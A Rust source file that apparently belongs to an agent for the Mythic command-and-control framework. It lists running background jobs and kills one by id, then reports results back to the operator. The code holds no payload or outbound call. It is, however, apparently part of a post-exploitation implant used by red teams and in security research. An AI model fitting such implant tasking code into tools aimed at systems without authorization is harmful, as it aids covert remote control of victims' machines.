use crate::agent::AgentTask;
use crate::tasking::BackgroundTask;
use crate::{mythic_error, mythic_success};
use serde::Deserialize;
use std::error::Error;
use std::result::Result;
use std::sync::atomic::Ordering;

/// Gets a list of running background jobs
/// * `task` - Task information
/// * `jobs` - List of background jobs
pub fn list_jobs(task: &AgentTask, jobs: &[BackgroundTask]) -> serde_json::Value {
    let mut user_output = String::new();

    // Iterate over each active background job
    for job in jobs {
        // Create the header with the job information
        let job_display = format!(
            "========\nJob id: {}\nCommand: {}\nParameters: {}\n\n",
            job.id, job.command, job.parameters
        );

        // Append the job information to the output
        user_output.push_str(&job_display);
    }

    // Check if there are no running jobs and create the output
    if user_output.is_empty() {
        user_output = "No background jobs running.".to_string();
    }

    // Return the output to Mythic
    mythic_success!(task.id, user_output)
}

/// Struct for holding the parameters for the `jobkill` command
#[derive(Deserialize)]
struct KillJobArgs {
    /// Id of the job to kill
    id: u32,
}

/// Kills a job based on the job id
/// * `task` - Task information
/// * `jobs` - List of running background jobs
pub fn kill_job(
    task: &AgentTask,
    jobs: &[BackgroundTask],
) -> Result<Vec<serde_json::Value>, Box<dyn Error>> {
    // Parse the arguments into a struct
    let args: KillJobArgs = serde_json::from_str(&task.parameters)?;

    // Parse out the job id to kill
    let jid = args.id;

    // Iterate over all running background jobs
    for job in jobs {
        // Check if there is a job id match
        if job.id == jid {
            // Mark the job as not running
            job.running.store(false, Ordering::SeqCst);

            if job.killable {
                // Return the output to Mythic for both the current task and the task
                // which was manually killed
                return Ok(vec![
                    mythic_success!(task.id, format!("Stopped job {}", job.id)),
                    mythic_success!(job.uuid, "\nJob manually killed"),
                ]);
            } else {
                return Ok(vec![
                    mythic_success!(task.id, format!("Stopped job {}", job.id)),
                    mythic_error!(job.uuid, "\nJob manually killed"),
                ]);
            };
        }
    }

    // Could not find a job id match
    Ok(vec![mythic_error!(
        task.id,
        format!("Failed to find job with id {}", args.id)
    )])
}
